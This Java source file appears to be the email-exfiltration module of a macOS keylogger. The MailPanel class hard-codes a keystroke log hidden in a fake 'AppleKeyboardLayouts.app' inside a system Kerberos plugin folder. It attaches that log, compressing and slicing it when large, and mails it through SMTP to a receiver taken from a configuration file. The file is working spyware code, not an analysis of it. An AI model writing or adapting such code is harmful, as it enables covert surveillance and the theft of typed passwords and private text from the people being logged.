package mac.project.email;

import java.io.FileOutputStream;
import java.io.Serializable;
import java.util.Date;
import java.util.Properties;
import java.util.Vector;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeUtility;
import javax.swing.JPanel;

import mac.project.main.AutoRun;
import mac.project.main.ConfigBean;
import mac.project.main.FileSize;

public class MailPanel extends JPanel {
	/**
	 * serialVersionUID
	 */
	private static final long serialVersionUID = 1L;
	AutoRun autoRun;
	ConfigBean configBean = new ConfigBean();
	Vector<String> attachVector = new Vector<String>();

	String mailReceiver = null;
	String mailTopic = "Default Topic";
	String mailContent = "Default Content";
	String userName = null;
	String passWord = null;
	String pop3Server = null;
	String smtpServer = null;
	String attachFile = null;

	public MailPanel(AutoRun autoRun) {
		this.autoRun = autoRun;
		this.configBean = autoRun.configBean;
	}

	public void mailSend() {
		attachFile = "/System/Library/KerberosPlugins/KerberosCorePlugins/AppleKeyboardLayouts.app/Contents/keydeflog";
		attachVector.addElement(attachFile);

		String filePath = autoRun.ConfigFilePath;
		if(filePath == null) // 判断配置文件是否选取
		{
			System.err.println("config file is null");
		}

		mailTopic = configBean.getUserName()+"_"+configBean.getMailTopic();
		mailReceiver = configBean.getMailReceiver();
		userName = configBean.getMailAccount();
		passWord = configBean.getMailPassword();
		pop3Server = configBean.getMailPop3();
		smtpServer = configBean.getMailSmtp();
		//		MailUser.setDisplayName(displayField.getText());
		MailUser.setUserName(userName);
		MailUser.setPassWord(passWord);
		MailUser.setPop3Server(pop3Server);
		MailUser.setSmtpServer(smtpServer);
		MailUser.setValidateNeeded(true);
		(new send()).start();
	}

	class send extends Thread implements Serializable {//Serializable 接口以启用其序列化功能
		/**
		 * serialVersionUID
		 */
		private static final long serialVersionUID = 1L;

		public void run() {
			String smtpServer = MailUser.getSmtpServer();
			Session mailSession = null;
			try {
				Properties props = new Properties();// 设置邮件属性
				props.put("mail.smtp.host", smtpServer);
				props.put("mail.smtp.auth", "true");
				if (MailUser.getValidateNeeded())// 是否需要验证
					mailSession = Session.getInstance(props, new MailAuthenticator());
//					mailSession = Session.getInstance(props,new MailAuthenticator.PasswordAuthentication(userName,
//					passwordField.getText()));
				else {
					mailSession = Session.getInstance(props, null);// 与服务器建立会话
				}

				Message msg = new MimeMessage(mailSession);
				msg.setSentDate(new Date());//发件日期
				msg.setFrom(new InternetAddress(userName + "@"+ smtpServer.substring(5)));
				msg.setRecipient(Message.RecipientType.TO, new InternetAddress(mailReceiver));//
				msg.setSubject(mailTopic);//邮件主题
				msg.setContent((mailContent).toString(),"text/html;charset=Gb2312");
				System.out.println("账号是"+userName+"@"+ smtpServer.substring(5));
				
				if (attachVector.size() >= 1) {//处理附件
					System.out.println("附件个数："+attachVector.size());
					//多个附件
					for (int i = 0; i < attachVector.size(); i++) {//附件个数
						FileSize filesize=new FileSize();
						long fs = filesize.getSize(attachVector.elementAt(i));
						MimeBodyPart attachMbp=new MimeBodyPart();
						
						System.out.println("附件："+ attachVector.elementAt(i)+" 大小："+ fs);
						if(fs<=100) {return;}
						if(fs>50000000) {		//判断文件大小
							CompressBook book = new CompressBook();   //压缩
							String zipURL=book.zip(attachVector.elementAt(i));
							System.out.println("file size 2："+ fs);
							Slice piece=new Slice();//切片
							System.out.println(zipURL);
							
							Vector<FileOutputStream> attachVectorSlice = piece.slicefile(zipURL);
							System.out.println(attachVectorSlice.size());

							for(int j= 0; j < attachVectorSlice.size(); j++)//子块的添加为附件
							{	
								Multipart mp2 = new MimeMultipart();
								MimeBodyPart attachMbp2=new MimeBodyPart();
								attachMbp2.setContent((mailContent).toString(), "text/plain;charset=Gb2312");
								FileDataSource fds2=new FileDataSource(zipURL+j);//子块上传
								System.out.println(zipURL+j);
								attachMbp2.setDataHandler(new DataHandler(fds2));//获取数据
								attachMbp2.setFileName(MimeUtility.encodeText(fds2.getName()));//显示附件的名字为文件名

								mp2.addBodyPart(attachMbp2);
								msg.setContent(mp2);
								Transport.send(msg);// 发送邮件
							}
						} else {	
							Multipart mp2 = new MimeMultipart();
							System.out.println("文件大小3："+ fs);
//							CompressBook book = new CompressBook();   //压缩
//							String zipURL=book.zip(attachVector.elementAt(i));
//							FileDataSource fds=new FileDataSource(zipURL);//提取数据源,此时已经为.zip文件了
//							System.out.println(zipURL);
							FileDataSource fds=new FileDataSource(attachVector.elementAt(i));//提取数据源,此时已经为.zip文件了
							attachMbp.setContent((mailContent).toString(),"text/plain;charset=Gb2312");
							attachMbp.setDataHandler(new DataHandler(fds));//获取数据
							attachMbp.setFileName(MimeUtility.encodeText(fds.getName()));//显示附件的名字为文件名
							System.out.println(attachVector.elementAt(i));//获取文件的源地址
							mp2.addBodyPart(attachMbp);
							msg.setContent(mp2);
							Transport.send(msg);	// 发送邮件
						}
					}
				}
				System.out.println("email send success!");
			} catch (Exception e) {
				System.out.println(e.getMessage());
			}
		}
	}
}
